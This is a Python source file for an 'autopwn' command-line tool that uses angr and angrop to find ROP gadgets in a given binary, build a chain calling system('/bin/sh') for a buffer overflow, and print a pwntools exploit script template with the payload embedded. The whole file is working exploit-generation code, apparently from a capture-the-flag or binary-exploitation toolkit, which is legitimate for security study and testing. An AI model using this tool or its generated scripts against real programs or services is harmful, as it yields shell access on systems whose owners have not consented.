"""Command: autopwn — automatic exploit generation via ROP."""

import click
import sys
from ..core.loader import load_binary
from ..core.formatter import OutputFormatter

@click.command("autopwn")
@click.argument("binary", type=click.Path(exists=True))
@click.option("--vuln", default="bof", help="Target vulnerability type (bof)")
@click.option("--target-func", default="system", help="Function to jump to (default: system)")
@click.option("--target-arg", default="/bin/sh", help="Argument to pass (default: /bin/sh)")
def cmd_autopwn(binary, vuln, target_func, target_arg):
    """Generate ROP chains automatically."""
    fmt = OutputFormatter()
    fmt.info(f"AutoPwn initialized for: {binary}")

    try:
        import angr
        import angrop
    except ImportError:
        fmt.error("angrop not installed. run: pip install angrop")
        sys.exit(1)

    proj = load_binary(binary)
    rop = proj.analyses.ROP()
    fmt.info("Finding ROP gadgets (this might take a while)...")
    rop.find_gadgets()

    fmt.success(f"Found {len(rop.gadgets)} gadgets.")

    chain = None
    if vuln == "bof":
        # Find ROP chain to call system("/bin/sh")
        try:
            chain = rop.func_call(target_func, [target_arg])
            fmt.success(f"Successfully generated ROP chain for {target_func}('{target_arg}')")
        except Exception as e:
            fmt.error(f"Failed to generate ROP chain: {e}")
            sys.exit(1)

    if chain:
        fmt.header("Generated Exploit Script (Pwntools)")
        script = _generate_pwntools_script(binary, chain.payload_str())
        click.echo(click.style(script, fg="cyan"))


def _generate_pwntools_script(binary, payload):
    return f'''#!/usr/bin/env python3
from pwn import *

# Context
context.binary = elf = ELF('{binary}')
# p = process('{binary}')
# p = remote('target', 1337)

# Chain Payload
payload = {repr(payload)}

# Send
print("[*] Sending payload...")
# p.sendline(padding + payload)
# p.interactive()
'''
